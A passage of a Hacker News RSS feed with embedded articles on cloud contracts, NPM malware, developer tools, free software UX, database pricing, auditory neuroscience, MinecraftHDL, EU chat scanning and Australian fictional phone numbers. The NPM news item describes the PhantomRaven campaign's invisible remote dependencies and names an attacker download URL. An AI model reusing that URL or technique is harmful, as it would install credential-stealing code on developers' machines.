    &lt;p&gt;The Israeli finance ministry spokesperson said Google and Amazon are “bound by stringent contractual obligations that safeguard Israel’s vital interests”. They added: “These agreements are confidential and we will not legitimise the article’s claims by disclosing private commercial terms.”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45746482</guid><pubDate>Wed, 29 Oct 2025 13:20:03 +0000</pubDate></item><item><title>NPM flooded with malicious packages downloaded more than 86k times</title><link>https://arstechnica.com/security/2025/10/npm-flooded-with-malicious-packages-downloaded-more-than-86000-times/</link><description>&lt;doc fingerprint="771a9388954b799"&gt;
  &lt;main&gt;
    &lt;p&gt;Attackers are exploiting a major weakness that has allowed them access to the NPM code repository with more than 100 credential-stealing packages since August, mostly without detection.&lt;/p&gt;
    &lt;p&gt;The finding, laid out Wednesday by security firm Koi, brings attention to an NPM practice that allows installed packages to automatically pull down and run unvetted packages from untrusted domains. Koi said a campaign it tracks as PhantomRaven has exploited NPM’s use of “Remote Dynamic Dependencies” to flood NPM with 126 malicious packages that have been downloaded more than 86,000 times. Some 80 of those packages remained available as of Wednesday morning, Koi said.&lt;/p&gt;
    &lt;head rend="h2"&gt;A blind spot&lt;/head&gt;
    &lt;p&gt;“PhantomRaven demonstrates how sophisticated attackers are getting [better] at exploiting blind spots in traditional security tooling,” Koi’s Oren Yomtov wrote. “Remote Dynamic Dependencies aren’t visible to static analysis.”&lt;/p&gt;
    &lt;p&gt;Remote Dynamic Dependencies provide greater flexibility in accessing dependencies—the code libraries that are mandatory for many other packages to work. Normally, dependencies are visible to the developer installing the package. They’re usually downloaded from NPM’s trusted infrastructure.&lt;/p&gt;
    &lt;p&gt;RDD works differently. It allows a package to download dependencies from untrusted websites, even those that connect over HTTP, which is unencrypted. The PhantomRaven attackers exploited this leniency by including code in the 126 packages uploaded to NPM. The code downloads malicious dependencies from URLs, including http://packages.storeartifact.com/npm/unused-imports. Koi said these dependencies are “invisible” to developers and many security scanners. Instead, they show the package contains “0 Dependencies.” An NPM feature causes these invisible downloads to be automatically installed.&lt;/p&gt;
    &lt;p&gt;Compounding the weakness, the dependencies are downloaded “fresh” from the attacker server each time a package is installed, rather than being cached, versioned, or otherwise static, as Koi explained:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45755027</guid><pubDate>Thu, 30 Oct 2025 00:37:33 +0000</pubDate></item><item><title>Show HN: I made a heatmap diff viewer for code reviews</title><link>https://0github.com</link><description>&lt;doc fingerprint="5f30552b55a047fe"&gt;
  &lt;main&gt;
    &lt;p&gt;Heatmap color-codes every diff line/token by how much human attention it probably needs. Unlike PR-review bots, we try to flag not just by “is it a bug?” but by “is it worth a second look?” (examples: hard-coded secret, weird crypto mode, gnarly logic).&lt;/p&gt;
    &lt;p&gt;To try it, replace github.com with 0github.com in any GitHub pull request url. Under the hood, we clone the repo into a VM, spin up gpt-5-codex for every diff, and ask it to output a JSON data structure that we parse into a colored heatmap.&lt;/p&gt;
    &lt;p&gt;Examples:&lt;/p&gt;
    &lt;p&gt;Heatmap is open source:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45760321</guid><pubDate>Thu, 30 Oct 2025 14:21:58 +0000</pubDate></item><item><title>Free software scares normal people</title><link>https://danieldelaney.net/normal/</link><description>&lt;doc fingerprint="a23b437c2441cdbd"&gt;
  &lt;main&gt;
    &lt;p&gt;I’m the person my friends and family come to for computer-related help. (Maybe you, gentle reader, can relate.) This experience has taught me which computing tasks are frustrating for normal people.&lt;/p&gt;
    &lt;p&gt;Normal people often struggle with converting video. They will need to watch, upload, or otherwise do stuff with a video, but the format will be weird. (Weird, broadly defined, is anything that won’t play in QuickTime or upload to Facebook.)&lt;/p&gt;
    &lt;p&gt;I would love to recommend Handbrake to them, but the user interface is by and for power users. Opening it makes normal people feel unpleasant feelings.&lt;/p&gt;
    &lt;p&gt;This problem is rampant in free software. The FOSS world is full of powerful tools that only have a “power user” UI. As a result, people give up. Or worse: they ask people like you and I to do it for them.&lt;/p&gt;
    &lt;p&gt;I want to make the case to you that you can (and should) solve this kind of problem in a single evening.&lt;/p&gt;
    &lt;p&gt;Take the example of Magicbrake, a simple front end I built. It hides the power and flexibility of Handbrake. It does only the one thing most people need Handbrake for: taking a weird video file and making it normal. (Normal, for our purposes, means a small MP4 that works just about anywhere.)&lt;/p&gt;
    &lt;p&gt;There is exactly one button.&lt;/p&gt;
    &lt;p&gt;This is a fast and uncomplicated thing to do. Unfortunately, the people who have the ability to solve problems like this are often disinclined to do it.&lt;/p&gt;
    &lt;p&gt;“Why would you make Handbrake less powerful on purpose?”&lt;/p&gt;
    &lt;p&gt;“What if someone wants a different format?”&lt;/p&gt;
    &lt;p&gt;“What about [feature/edge case]?”&lt;/p&gt;
    &lt;p&gt;The answer to all these questions is the same: a person who needs or wants that stuff can use Handbrake. If they don’t need everything Handbrake can do and find it bewildering, they can use this. Everyone wins.&lt;/p&gt;
    &lt;p&gt;It’s a bit like obscuring the less-used functions on a TV remote with tape. The functions still exist if you need them, but you’re not required to contend with them just to turn the TV on.&lt;/p&gt;
    &lt;p&gt;People benefit from stuff like this, and I challenge you to make more of it. Opportunities are everywhere. The world is full of media servers normal people can’t set up. Free audio editing software that requires hours of learning to be useful for simple tasks. Network monitoring tools that seem designed to ward off the uninitiated. Great stuff normal people don’t use. All because there’s only one UI, and it’s designed to do everything.&lt;/p&gt;
    &lt;p&gt;80% of the people only need 20% of the features. Hide the rest from them and you’ll make them more productive and happy. That’s really all it takes.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45760878</guid><pubDate>Thu, 30 Oct 2025 15:07:15 +0000</pubDate></item><item><title>PlanetScale Offering $5 Databases</title><link>https://planetscale.com/blog/5-dollar-planetscale</link><description>&lt;doc fingerprint="27dfe46f2515530c"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;$5 PlanetScale&lt;/head&gt;
    &lt;p&gt;By Sam Lambert |&lt;/p&gt;
    &lt;p&gt;PlanetScale is synonymous with quality, performance, and reliability. Up until now, the entry level PlanetScale cluster configuration was 3 node, multi-AZ, and highly available. At $30 a month this is incredible value, however, not everyone wants or needs HA.&lt;/p&gt;
    &lt;p&gt;Every day we get requests for an entry level tier that is more accessible to builders on day 1. People want the quality of PlanetScale and our game changing features like Insights without the cost overhead of 3 nodes.&lt;/p&gt;
    &lt;p&gt;Over the next couple of months we will be rolling out a single node, non-HA mode for PlanetScale Postgres and introducing a new node type: The &lt;code&gt;PS-5&lt;/code&gt; which is priced at $5 a month. Single node is perfect for development, testing, and non-critical workloads. Customers will be able to vertically scale a single node to meet their needs without having to add replicas or sacrifice durability.&lt;/p&gt;
    &lt;p&gt;You can sign up here to be notified when single node releases.&lt;/p&gt;
    &lt;p&gt;Our starter pricing is now:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Node Class&lt;/cell&gt;
        &lt;cell role="head"&gt;Mode&lt;/cell&gt;
        &lt;cell role="head"&gt;Price&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;PS-5 (arm and intel)&lt;/cell&gt;
        &lt;cell&gt;Single node&lt;/cell&gt;
        &lt;cell&gt;$5&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;PS-10 (arm)&lt;/cell&gt;
        &lt;cell&gt;Single node&lt;/cell&gt;
        &lt;cell&gt;$10&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;PS-10 (intel)&lt;/cell&gt;
        &lt;cell&gt;Single node&lt;/cell&gt;
        &lt;cell&gt;$13&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;PS-10 (arm)&lt;/cell&gt;
        &lt;cell&gt;HA (3 node)&lt;/cell&gt;
        &lt;cell&gt;$30&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;PS-10 (intel)&lt;/cell&gt;
        &lt;cell&gt;HA (3 node)&lt;/cell&gt;
        &lt;cell&gt;$39&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;If you're bullish on your company's future, you know you'll need to scale eventually, and the database is usually the first bottleneck. We talk to startups daily who experienced unexpected fast growth and have to scramble through emergency migrations to PlanetScale to handle the load, a stressful process when you're in the spotlight. With more approachable pricing from day 1, you can now start small and grow to hyper scale without ever changing your database platform or dealing with a complex migration.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45761027</guid><pubDate>Thu, 30 Oct 2025 15:20:37 +0000</pubDate></item><item><title>Affinity Studio now free</title><link>https://www.affinity.studio/get-affinity</link><description>&lt;doc fingerprint="3bd67e5e966d06c5"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Get Affinity&lt;/head&gt;
    &lt;p&gt;Available on desktop for&lt;/p&gt;
    &lt;p&gt;The all-in-one creative app, with everything you need to craft designs, edit images, and lay it all out, without ever leaving your document or paying a thing.&lt;/p&gt;
    &lt;quote&gt;$0, free&lt;/quote&gt;
    &lt;p&gt;To download Affinity, sign in with your Canva account (or create one for free).&lt;/p&gt;
    &lt;head rend="h2"&gt;One powerful app. No cost.&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Fully-featured toolsets&lt;/p&gt;
        &lt;p&gt;From vector to pixel to layout, Affinity has all the studio-grade tools you need under one roof.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Customizable studios&lt;/p&gt;
        &lt;p&gt;Mix and match your favorite tools to build your very own creative studios.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Non-destructive editing&lt;/p&gt;
        &lt;p&gt;Experiment as much you want, keep your original files intact.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Pixel-perfect export&lt;/p&gt;
        &lt;p&gt;Full control over how your work leaves the app, whether it’s by object, slice, or doc.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;What you’ll get&lt;/head&gt;
    &lt;p&gt;With Affinity, you’ll get all the professional tools you need for your design, photo editing, and page layout projects, free of charge. If you’re on a Canva premium plan, you’ll also be able to unlock Canva AI tools directly in Affinity for a super-powered workflow.&lt;/p&gt;
    &lt;p&gt;+ Canva premium plans&lt;/p&gt;
    &lt;head rend="h2"&gt;Design workflows&lt;/head&gt;
    &lt;p&gt;Access all vector design, photo editing, and page layout tools in one app&lt;/p&gt;
    &lt;p&gt;Combine vector and pixel work on the same .af document&lt;/p&gt;
    &lt;p&gt;Customize your workspace with floating toolbars and studio presets&lt;/p&gt;
    &lt;p&gt;Real-time performance engine for ultra-smooth editing&lt;/p&gt;
    &lt;p&gt;Non-destructive editing across layers, filters, and adjustments&lt;/p&gt;
    &lt;p&gt;Import PSD, AI, PDF, SVG, IDML and more with high fidelity&lt;/p&gt;
    &lt;p&gt;Export with one-click presets or custom slice-based output&lt;/p&gt;
    &lt;p&gt;Quick export direct to Canva&lt;/p&gt;
    &lt;head rend="h2"&gt;Powerful photo editing&lt;/head&gt;
    &lt;p&gt;Live filters and adjustments with instant preview&lt;/p&gt;
    &lt;p&gt;Full RAW editing, tone mapping, and lens correction&lt;/p&gt;
    &lt;p&gt;Advanced retouching: inpainting brush, healing tools, dodge and burn&lt;/p&gt;
    &lt;p&gt;Batch processing with recordable macros, HDR merge, panorama stitching, and more&lt;/p&gt;
    &lt;head rend="h2"&gt;Pro vector design&lt;/head&gt;
    &lt;p&gt;Precision drawing with pen, node, and pencil tools&lt;/p&gt;
    &lt;p&gt;Live shape editing, booleans, and shape builder&lt;/p&gt;
    &lt;p&gt;Flexible gradients with full control&lt;/p&gt;
    &lt;p&gt;Trace pixel images&lt;/p&gt;
    &lt;p&gt;Pixel-perfect vector tools for illustration and layout&lt;/p&gt;
    &lt;head rend="h2"&gt;Advanced page layout&lt;/head&gt;
    &lt;p&gt;Linked text frames with autoflow and live text wrapping&lt;/p&gt;
    &lt;p&gt;Smart master pages with overrides and reusable layouts&lt;/p&gt;
    &lt;p&gt;Pro typography: ligatures, stylistic sets, drop caps, and variable fonts&lt;/p&gt;
    &lt;p&gt;Print-ready output: CMYK, spot colours, preflight, bleed, and slug support&lt;/p&gt;
    &lt;p&gt;Data merge from .csv with tokens, image merge, and conditional logic&lt;/p&gt;
    &lt;head rend="h2"&gt;Canva AI Studio&lt;/head&gt;
    &lt;p&gt;Generative Fill, Expand, and Edit&lt;/p&gt;
    &lt;p&gt;Generate Images and Vectors&lt;/p&gt;
    &lt;p&gt;Remove Background and Subject Selection&lt;/p&gt;
    &lt;p&gt;Colorize, Depth Selection, and Super Resolution&lt;/p&gt;
    &lt;p&gt;Portrait Blur and Portrait Lighting&lt;/p&gt;
    &lt;p&gt;Full AI generation history&lt;/p&gt;
    &lt;head rend="h2"&gt;Need Affinity for your organization?&lt;/head&gt;
    &lt;p&gt;Skip the individual downloads and get your entire team on Affinity with SSO via a Canva Enterprise or Canva Districts account. Choose an option below to get started.&lt;/p&gt;
    &lt;head rend="h2"&gt;FAQs&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Yes, Affinity really is free. That doesn’t mean you’re getting a watered-down version of the app though. You can use every tool in the Pixel, Vector, and Layout studios, plus all of the customization and export features, as much as you want, with no restrictions or payment needed. The app will also receive free updates with new features and improvements added.&lt;/p&gt;
        &lt;p&gt;If you’re on a Canva premium plan (Pro, Business, Enterprise, Education), you’ll also be able to unlock Canva’s powerful AI tools within Affinity via the Canva AI Studio.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Yes. Affinity is now brought to you by Canva, and your Canva account gives you access to Affinity and other Canva products and features.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;No. You can access all of Affinity’s vector, layout, and pixel tools for free without a Canva subscription. If you’d like to unlock Canva AI tools within Affinity, however, you will need a premium Canva plan.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;This is a brand-new product that gives you advanced photo editing, graphic design, and page layout tools under one roof. It includes highly requested features such as Image Trace, ePub support, mesh gradients, hatch fills, live glitch filter, as well as custom capabilities that allow you to rearrange panels and combine tools to build your own unique studios. Plus, with a Canva premium plan, you can unlock incredibly powerful AI tools such as Generative Fill, Generative Expand, Generate Image/Vector, and more — directly in Affinity.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Yes. With a Canva premium plan you can unlock Canva AI features in Affinity.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;No, these are only available to those with Canva premium accounts.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Affinity is currently available on Windows and macOS (iPadOS coming soon!).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;We’re busy building our iPad version — stay tuned for updates!&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Affinity is optimized for the latest hardware, including Apple silicon.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Absolutely! The new desktop version of Affinity can open all files created in Affinity V2 or V1 apps. However, Affinity V1 and V2 cannot open files that are created or saved in the newer app, Affinity by Canva.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;No, it’s the same app, just available on different operating systems.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Yes, you can install Affinity on as many devices as you like.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Yes! It’s easy to import PSDs, AIs, IDMLs, DWGs, and other file types into Affinity, with structure, layers, and creative intent preserved.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Affinity is available in English, French, German, Italian, Spanish, Portuguese, Japanese, Chinese, Bahasa Indonesian, and Turkish. Keep an eye out for more languages coming soon!&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Get in touch to speak to our team about how your organization can get set up with Affinity, including SSO.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Then all you need to do is stay in one of our pre-built studios: Pixel, Vector or Layout. You’ll find all your favorite tools there, plus some new ones. Since it’s all free, just think of the other creative toolsets as an added bonus!&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That’s totally fine. Your Affinity V2 license (via Serif) remains valid and Serif will continue to keep activation servers online. But please note that these apps won’t receive future updates.&lt;/p&gt;
        &lt;p&gt;For the best experience, we recommend using the new Affinity by Canva app.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;No. The new desktop version of Affinity can open all files created in V2, but older versions (including V2 on iPad) cannot open newer Affinity (.af) files, meaning you won’t be able to work across both platforms.&lt;/p&gt;&lt;lb/&gt;We don’t have a release date for the new Affinity on iPad yet, so recommend continuing to run V2 independently while you enjoy the new Affinity on desktop.&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Yes. The new Affinity by Canva app will receive free updates and new features over time.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;You will need to be online to download and activate your license with your free Canva account. From then on, there is no requirement to be online, even with extended offline periods.&lt;/p&gt;
        &lt;p&gt;There are a couple of things to keep in mind:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;There are some features which do require you to be online, if you choose to use them, such as product help, lessons, stock libraries and integrations with Canva including AI tools.&lt;/item&gt;
          &lt;item&gt;We’ll also be releasing new updates and patches regularly, so we recommend connecting from time to time to keep your app up to date, but it's not a requirement of use.&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;You need a Canva premium plan to unlock all of Canva’s AI features in Affinity. Simply download the Affinity app via our Downloads page and follow the prompts once you click ‘Canva AI Studio’.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45761445</guid><pubDate>Thu, 30 Oct 2025 15:54:38 +0000</pubDate></item><item><title>Launch HN: Propolis (YC X25) – Browser agents that QA your web app autonomously</title><link>https://app.propolis.tech/#/launch</link><guid isPermaLink="false">https://news.ycombinator.com/item?id=45762012</guid><pubDate>Thu, 30 Oct 2025 16:40:02 +0000</pubDate></item><item><title>The ear does not do a Fourier transform (2024)</title><link>https://www.dissonances.blog/p/the-ear-does-not-do-a-fourier-transform</link><description>&lt;doc fingerprint="a63e213260f69383"&gt;
  &lt;main&gt;
    &lt;p&gt;Let’s talk about how the cochlea computes!&lt;/p&gt;
    &lt;p&gt;The tympanic membrane (eardrum) is vibrated by changes in air pressure (sound waves). Bones in the middle ear amplify and send these vibrations to the fluid-filled, snail-shaped cochlea. Vibrations travel through the fluid to the basilar membrane, which remarkably performs frequency separation1: the stiffer, lighter base resonates with high frequency components of the signal, and the more flexible, heavier apex resonates with lower frequencies. Between the two ends, the resonant frequencies decrease logarithmically in space2.&lt;/p&gt;
    &lt;p&gt;The hair cells on different parts of the basilar membrane wiggle back and forth at the frequency corresponding to their position on the membrane. But how do wiggling hair cells translate to electrical signals? This mechanoelectrical transduction process feels like it could be from a Dr. Seuss world: springs connected to the ends of hair cells open and close ion channels at the frequency of the vibration, which then cause neurotransmitter release. Bruno calls them “trapdoors”. Here’s a visualization:&lt;/p&gt;
    &lt;p&gt;It’s clear that the hardware of the ear is well-equipped for frequency analysis. Nerve fibers serve as filters to extract temporal and frequency information about a signal. Below are examples of filters (not necessarily of the ear) shown in the time domain. On the left are filters that are more localized in time, i.e. when a filter is applied to a signal, it is clear when in the signal the corresponding frequency occurred. On the right are filters that have less temporal specificity, but are more uniformly distributed across frequencies compared to the left one.&lt;/p&gt;
    &lt;p&gt;Wouldn’t it be convenient if the cochlea were doing a Fourier transform, which would fit cleanly into how we often analyze signals in engineering? But no 🙅🏻♀️! A Fourier transform has no explicit temporal precision, and resembles something closer to the waveforms on the right; this is not what the filters in the cochlea look like.&lt;/p&gt;
    &lt;p&gt;We can visualize different filtering schemes, or tiling of the time-frequency domain, in the following figure. In the leftmost box, where each rectangle represents a filter, a signal could be represented at a high temporal resolution (similar to left filters above), but without information about its constituent frequencies. On the other end of the spectrum, the Fourier transform performs precise frequency decomposition, but we cannot tell when in the signal that frequency occurred (similar to right filters)3. What the cochlea is actually doing is somewhere between a wavelet and Gabor. At high frequencies, frequency resolution is sacrificed for temporal resolution, and vice versa at low frequencies.&lt;/p&gt;
    &lt;p&gt;Why would this type of frequency-temporal precision tradeoff be a good representation? One theory, explored in Lewicki 2002, is that these filters are a strategy to reduce the redundancy in the representation of natural sounds. Lewicki performed independent component analysis (ICA) to produce filters maximizing statistical independence, comparing environmental sounds, animal vocalizations, and human speech. The tradeoffs look different for each one, and you can kind of map them to somewhere in the above cartoon.&lt;/p&gt;
    &lt;p&gt;It appears that human speech occupies a distinct time-frequency space. Some speculate that speech evolved to fill a time-frequency space that wasn’t yet occupied by other existing sounds.&lt;/p&gt;
    &lt;p&gt;To drive the theory home, one that we have been hinting at since the outset: forming ecologically-relevant representations makes sense, as behavior is dependent on the environment. It appears that for audition, as well as other sensory modalities, we are doing this. This is a bit of a teaser for efficient coding, which we will get to soon.&lt;/p&gt;
    &lt;p&gt;We’ve talked about some incredible mechanisms that occur at the beginning of the sensory coding process, but it’s truly just the tiny tip of the ice burg. We also glossed over how these computations occur. The next lecture will zoom into the biophysics of computation in neurons.&lt;/p&gt;
    &lt;p&gt;We call this tonotopic organization, which is a mapping from frequency to space. This type of organization also exists in the cortex for other senses in addition to audition, such as retinotopy for vision and somatotopy for touch.&lt;/p&gt;
    &lt;p&gt;The relationship between human pitch perception and frequency is logarithmic. Coincidence? 😮&lt;/p&gt;
    &lt;p&gt;One could argue we should be comparing to a short-time Fourier transform, but this has resolution issues, and is still not what the cochlea appears to be doing.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45762259</guid><pubDate>Thu, 30 Oct 2025 17:01:20 +0000</pubDate></item><item><title>Minecraft HDL, an HDL for Redstone</title><link>https://github.com/itsfrank/MinecraftHDL</link><description>&lt;doc fingerprint="3271921d09773db1"&gt;
  &lt;main&gt;
    &lt;p&gt;Minecraft HDL is a digital synthesis flow for minecraft redstone circuits. It is an attempt to use industry standard design tools and methods to generate digital circuits with redstone.&lt;/p&gt;
    &lt;p&gt;This file &lt;code&gt;multiplexer4_1.v&lt;/code&gt; is a 6 input - 1 output circuit that selects one of the first 4 inputs (a, b, c, d) as the output based on the value of the last 2 inputs (x, y)&lt;/p&gt;
    &lt;code&gt;module multiplexer4_1 ( a ,b ,c ,d ,x ,y ,dout ); 
 
output dout ; 
input a, b, c, d, x, y; 
 
assign dout = (a &amp;amp; (~x) &amp;amp; (~y)) | 
     (b &amp;amp; (~x) &amp;amp; (y)) |  
     (c &amp;amp; x &amp;amp; (~y)) | 
     (d &amp;amp; x &amp;amp; y); 
endmodule &lt;/code&gt;
    &lt;p&gt;When synthesized through Minecraft HDL it produces this circuit:&lt;/p&gt;
    &lt;p&gt;With the 6 inputs on the right and the single output on the left&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Screenshots &amp;amp; Sample Circuits&lt;/item&gt;
      &lt;item&gt;Getting Started - Installing and Using MinecraftHDL&lt;/item&gt;
      &lt;item&gt;Background Theory - Digital Design &amp;amp; Verilog&lt;/item&gt;
      &lt;item&gt;How MinecraftHDL Works - Read Our Paper&lt;/item&gt;
      &lt;item&gt;Developper Info - If you want to fork or contribute&lt;/item&gt;
      &lt;item&gt;Quick Overview - Check out our poster&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;MinecraftHDL was the final undergraduate design project made by three students in the Electrical, Computer &amp;amp; Software Engineering department at McGill University.&lt;/p&gt;
    &lt;p&gt;It is by no means bug-free or even complete; It produces objectively inferior circuits to 'hand-made' redstone designs, and is not intended to be used in modded survival. It can generate almost any verilog circuit, however only simple designs will actually be testable in-game since any moderately-complex design will end up being longer than the maximum number of blocks loaded in Minecraft.&lt;/p&gt;
    &lt;p&gt;Additionally, we are currently unable to synthesize sequential circuits, aka any circuits with a loopback or feedback. That means no memory, no counters or any circuit that could hold a state.&lt;/p&gt;
    &lt;p&gt;MinecraftHDL is an educational tool to illustrate on a macro-scopic scale how microelectronic digital circuits are designed and produced. It is a great way to introduce younger audiences to the world of digital design and can also be used to illustrate the difference between software and hardware design to undergraduate engineers taking their first RTL class.&lt;/p&gt;
    &lt;p&gt;Supervisor: Brett H. Meyer - Website&lt;lb/&gt; Students: Francis O'Brien - Website&lt;lb/&gt; Omar Ba Mashmos&lt;lb/&gt; Andrew Penhale&lt;/p&gt;
    &lt;p&gt;To show how easy it is to make a circuit with MinecraftHDL here is a gif of me creating a circuit, synthesizing, and generating it in minecraft in less than a minute!&lt;/p&gt;
    &lt;p&gt;The circuit I generate above is a 2bit adder. It takes two numbers of two bits and adds them. At the end of the gif I set both input numbers to '11' which is the binary representation of the number 3. Then I move to the output and we see that O3=1, O2=1, and O1=0, this gives the binary number '110' which is indeed 6.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45763877</guid><pubDate>Thu, 30 Oct 2025 18:59:02 +0000</pubDate></item><item><title>Denmark reportedly withdraws Chat Control proposal following controversy</title><link>https://therecord.media/demark-reportedly-withdraws-chat-control-proposal</link><description>&lt;doc fingerprint="f3c7115416b5d37e"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Denmark reportedly withdraws Chat Control proposal following controversy&lt;/head&gt;
    &lt;p&gt;Denmark’s justice minister on Thursday said he will no longer push for an EU law requiring the mandatory scanning of electronic messages, including on end-to-end encrypted platforms.&lt;/p&gt;
    &lt;p&gt;Earlier in its European Council presidency, Denmark had brought back a draft law which would have required the scanning, sparking an intense backlash. Known as Chat Control, the measure was intended to crack down on the trafficking of child sex abuse materials (CSAM).&lt;/p&gt;
    &lt;p&gt;After days of silence, the German government on October 8 announced it would not support the proposal, tanking the Danish effort.&lt;/p&gt;
    &lt;p&gt;Danish Justice Minister Peter Hummelgaard told reporters on Thursday that his office will support voluntary CSAM detections.&lt;/p&gt;
    &lt;p&gt;"This will mean that the search warrant will not be part of the EU presidency's new compromise proposal, and that it will continue to be voluntary for the tech giants to search for child sexual abuse material," Hummelgaard said, according to local news reports.&lt;/p&gt;
    &lt;p&gt;The current model allowing for voluntary scanning expires in April, Hummelgaard said.&lt;/p&gt;
    &lt;p&gt;"Right now we are in a situation where we risk completely losing a central tool in the fight against sexual abuse of children,” he said. "That's why we have to act no matter what. We owe it to all the children who are subjected to monstrous abuse."&lt;/p&gt;
    &lt;p&gt;Meredith Whittaker, the president of the Signal Foundation, lobbied hard against the original measure, saying the organization would leave the European market if the provision was adopted.&lt;/p&gt;
    &lt;p&gt;“What they propose is in effect a mass surveillance free-for-all, opening up everyone’s intimate and confidential communications, whether government officials, military, investigative journalists, or activists,” she said at the time.&lt;/p&gt;
    &lt;p&gt;Suzanne Smalley&lt;/p&gt;
    &lt;p&gt;is a reporter covering privacy, disinformation and cybersecurity policy for The Record. She was previously a cybersecurity reporter at CyberScoop and Reuters. Earlier in her career Suzanne covered the Boston Police Department for the Boston Globe and two presidential campaign cycles for Newsweek. She lives in Washington with her husband and three children.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45765664</guid><pubDate>Thu, 30 Oct 2025 21:35:42 +0000</pubDate></item><item><title>Phone numbers for use in TV shows, films and creative works</title><link>https://www.acma.gov.au/phone-numbers-use-tv-shows-films-and-creative-works</link><description>&lt;doc fingerprint="c83d86dd4cb0f56b"&gt;
  &lt;main&gt;
    &lt;p&gt; On this page &lt;/p&gt;
    &lt;p&gt;Looking for info about unwanted calls? Learn more about phone scams and how you can make your number more private.&lt;/p&gt;
    &lt;head rend="h2"&gt;Geographical numbers&lt;/head&gt;
    &lt;p&gt;You can use the following prefixes and first 4 digits, then any 4 digits you like (shown here as 'xxxx').&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;
          &lt;p&gt;Region&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell role="head"&gt;
          &lt;p&gt;Number range&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Central East (covering NSW and ACT)&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;p&gt;(02) 5550 xxxx and (02) 7010 xxxx&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;South East (covering VIC and TAS)&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
